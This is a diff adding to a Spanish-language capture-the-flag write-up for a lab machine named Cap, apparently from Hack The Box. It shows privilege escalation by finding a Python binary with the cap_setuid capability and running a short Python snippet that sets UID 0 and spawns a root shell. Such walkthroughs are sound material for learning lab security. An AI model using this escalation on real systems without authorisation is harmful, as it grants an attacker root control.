@@ -95,5 +95,26 @@ aún no somos **root**, por lo que hacemos:
 sudo -l
 ```
 
-para ver si hay algo para explotar pero nos pide contraseña. Tampoco tenemos permisos SUID. Pensamos que si la máquina se llama Cap tiene algo que ver con capabilities por lo que miramos
+para ver si hay algo para explotar pero nos pide contraseña. Tampoco tenemos permisos SUID. Pensamos que si la máquina se llama Cap tiene algo que ver con **capabilities** por lo que miramos.
 
+```bash
+getcap -r / 2>/dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>
+
+Muestra que **/usr/bin/python3.8** tiene las capacidades **cap\_setuid** y **cap\_net\_bind\_service**, lo cual no es el valor predeterminado. **CAP\_SETUID** permite cambiar a UID 0 (root) sin necesidad del bit SUID.
+
+Ejecutamos.
+
+```bash
+python3.8
+
+import os
+os.setuid(0)
+os.system("/bin/bash")
+```
+
+Ya somos **root**.
+
+<figure><img src="../../.gitbook/assets/image (1162).png" alt=""><figcaption></figcaption></figure>
